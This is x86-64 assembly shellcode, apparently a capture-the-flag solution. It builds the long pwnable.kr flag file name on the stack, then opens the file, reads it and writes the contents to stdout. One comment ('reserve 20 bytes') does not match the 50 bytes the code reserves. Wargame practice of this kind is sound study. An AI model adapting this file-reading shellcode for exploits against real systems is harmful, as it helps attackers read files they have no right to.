[global _start]

_start:
  push rdx
  mov rax, 0x676e6f306f306f
  push rax
  mov rax, 0x306f306f306f306f
  push rax
  mov rax, 0x3030303030303030
  push rax
  mov rax, 0x303030306f6f6f6f
  push rax
  mov rax, 0x6f6f6f6f6f6f6f6f
  push rax
  push rax
  mov rax, 0x6f6f6f3030303030
  push rax
  mov rax, 0x3030303030303030
  push rax
  push rax
  mov rax, 0x303030306f6f6f6f
  push rax
  mov rax, 0x6f6f6f6f6f6f6f6f
  push rax
  push rax
  push rax
  push rax
  push rax
  push rax
  push rax
  push rax
  push rax
  mov rax, 0x6c5f797265765f73
  push rax
  mov rax, 0x695f656d616e5f65
  push rax
  mov rax, 0x6c69665f6568745f
  push rax
  mov rax, 0x7972726f732e656c
  push rax
  mov rax, 0x69665f736968745f
  push rax
  mov rax, 0x646165725f657361
  push rax
  mov rax, 0x656c705f656c6966
  push rax
  mov rax, 0x5f67616c665f726b
  push rax
  mov rax, 0x2e656c62616e7770
  push rax
  mov rax, 0x5f73695f73696874
  push rax

  ; open(const char *filename, int flags, int mode)
  xor rax, rax
  add al, 2       ; sys_open
  mov rdi, rsp    ; filename
  xor rsi, rsi    ; flags = 0
  xor rdx, rdx    ; mode = 0
  syscall

  ; read(int fd, char *buf, size_t count)
  mov rdi, rax    ; fd
  xor rax, rax    ; sys_read
  sub rsp, 50     ; reserve 20 bytes on the stack
  mov rsi, rsp    ; buf
  mov rdx, 50     ; count (number of bytes to read)
  syscall

  ; write(int fd, char *buf, size_t count)
  mov rdx, rax    ; count (number of bytes read)
  xor rax, rax
  inc rax         ; sys_write
  xor rdi, rdi
  inc rdi         ; stdout
  mov rsi, rsp    ; buf
  syscall
  ret
